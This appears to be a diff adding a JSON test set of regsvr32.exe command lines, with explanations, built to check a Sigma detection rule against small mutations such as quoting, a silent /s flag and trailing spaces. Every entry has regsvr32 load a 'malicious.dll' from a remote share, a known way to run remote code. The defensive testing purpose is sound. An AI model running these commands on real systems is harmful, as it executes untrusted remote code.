@@ -1,0 +1,22 @@
+[
+  {
+    "output": "regsvr32.exe \\\\remote\\share\\malicious.dll",
+    "explanation": "This command simulates a suspicious execution of regsvr32.exe with a remote DLL path, matching the Sigma rule's detection criteria."
+  },
+  {
+    "output": "regsvr32.exe \"\\\\remote\\share\\malicious.dll\"",
+    "explanation": "Adding quotes around the remote path demonstrates insertion mutation while maintaining the same behavior and detection match."
+  },
+  {
+    "output": "regsvr32.exe \\\\remote\\share\\malicious.dll /s",
+    "explanation": "Appending a silent execution flag (/s) demonstrates reordering and addition of optional arguments, which does not affect the rule's detection."
+  },
+  {
+    "output": "regsvr32.exe \\\\remote\\share\\malicious.dll   ",
+    "explanation": "Extra spaces at the end of the command line demonstrate insertion mutation while preserving the original behavior and detection match."
+  },
+  {
+    "output": "regsvr32.exe \\\\remote\\share\\malicious.dll",
+    "explanation": "This is the base command line that matches the Sigma rule's criteria for detection."
+  }
+]
